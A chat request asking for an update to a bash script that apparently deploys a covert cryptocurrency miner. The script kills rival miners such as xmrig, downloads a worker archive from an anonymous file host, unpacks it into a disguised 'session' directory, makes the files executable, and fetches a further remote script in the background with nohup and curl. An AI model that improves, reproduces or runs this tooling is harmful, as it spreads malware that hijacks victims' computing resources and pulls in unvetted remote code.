can you update this 

#!/bin/bash

# Check if an argument is provided
if [ -z "$1" ]; then
  echo "Usage: $0 {1|2|3}"
  exit 1
fi

# Define the URLs
URL1="https://oshi.at/KEFN"
URL2="https://oshi.at/eLXs"
URL3="https://oshi.at/CzkH"

# Select the URL based on the argument
case $1 in
  1)
    URL=$URL1
    ;;
  2)
    URL=$URL2
    ;;
  3)
    URL=$URL3
    ;;
  *)
    echo "Invalid argument. Please use 1, 2, or 3."
    exit 1
    ;;
esac
echo "Removing other miner if any"
pkill xmrig
pkill session_ajqysbe
pkill session_ajqysbey
echo "Removing Done!"

# Download the file
echo "Downloading the Worker $1"
wget $URL -O kwarta.zip
if [ $? -ne 0 ]; then
  echo "Download failed. Please check the URL or your internet connection."
  exit 1
else
  echo "Download Complete."
fi

# Unzip the downloaded file
echo "Unzipping the file"
unzip kwarta.zip
if [ $? -ne 0 ]; then
  echo "Unzipping failed."
  rm -rf kwarta.zip
  exit 1
else
  echo "Unzipping Complete."
fi

# Remove the zip file
rm -rf kwarta.zip

# Change directory to the extracted folder
cd sess_aksd19sb187ss1ia901b23
if [ $? -ne 0 ]; then
  echo "Directory change failed. The expected directory may not exist."
  exit 1
fi

# Make all files in the directory executable
chmod +x *

# Execute additional script
echo "Downloading and executing additional script..."
if nohup curl_output=$(curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh") > /dev/null 2>&1 & then
    echo "Script download initiated. Executing in the background..."
else
    echo "Failed to initiate download or execute additional script using curl with nohup."
    # Use another method here if needed
fi

echo "Script executed successfully."
